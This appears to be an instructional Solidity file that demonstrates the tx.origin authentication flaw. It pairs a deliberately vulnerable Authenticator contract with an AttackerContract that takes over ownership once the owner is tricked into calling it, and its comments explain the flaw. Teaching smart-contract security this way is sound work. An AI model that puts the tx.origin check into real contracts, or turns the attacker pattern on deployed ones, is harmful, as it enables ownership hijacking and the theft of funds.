// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Authenticator {

    /**
 * This is the target contract that uses `tx.origin` for authentication. 
 * This is problematic because `tx.origin` represents the original 
 * sender of the transaction and can be exploited by an attacker.
*/

address public owner;

constructor() {
    owner = msg.sender;
}

function changeOwner() external {

    /** 
    * This check is vulnerable! If a different contract calls this
    * function, tx.origin would still refer to the original user who
    * initiated the transaction, not the contract that's currently calling
    * this function.
    */

    require(tx.origin == owner, "Only owner can change ownership");

    // this could be set to the attacker's contract
    owner = msg.sender;
 }
}


contract AttackerContract {
    Authenticator authenticator;
    
    constructor(address _authenticator) {
        authenticator = Authenticator(_authenticator);
    }

        /** 
     * This function will be used to trick the owner of Authenticator to call
     * it. When this function is called, it then calls the changeOwner()
     * function on Authenticator. Because Authenticator's changeOwner function
     * checks tx.origin and not msg.sender, it will see the original
     * transaction initiator (the unsuspecting user) as the sender, and not
     * this contract, thereby changing the ownership to this attacker contract.
     */

     function trickAuthenticatorContactOwnerToCallThis() external {
        authenticator.changeOwner();
     }
}